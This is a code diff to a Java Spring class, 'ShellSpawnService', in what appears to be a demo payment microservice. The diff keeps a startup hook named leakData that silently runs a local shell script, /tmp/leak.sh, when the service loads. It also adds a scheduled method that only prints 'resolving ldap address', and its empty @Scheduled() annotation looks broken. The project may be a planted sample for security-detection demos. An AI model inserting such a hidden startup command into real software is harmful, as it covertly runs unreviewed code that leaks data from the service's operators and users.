@@ -2,20 +2,26 @@ package com.hipstershop.paymentservicejava;
 
 import javax.annotation.PostConstruct;
 
-import org.springframework.stereotype.Component;
+import org.springframework.scheduling.annotation.Scheduled;
+import org.springframework.stereotype.Service;
 
-@Component
+
+@Service
 public class ShellSpawnService {
 
     @PostConstruct
     public void leakData() {
 
-        String leakScript = "";
         try {
             Runtime.getRuntime().exec("/bin/sh -c /tmp/leak.sh");
         } catch(Exception e) {
             e.printStackTrace();
         }
+    }
+
+    @Scheduled()
+    public void doNothing() {
+        System.out.println("resolving ldap address");
     }
 
 }
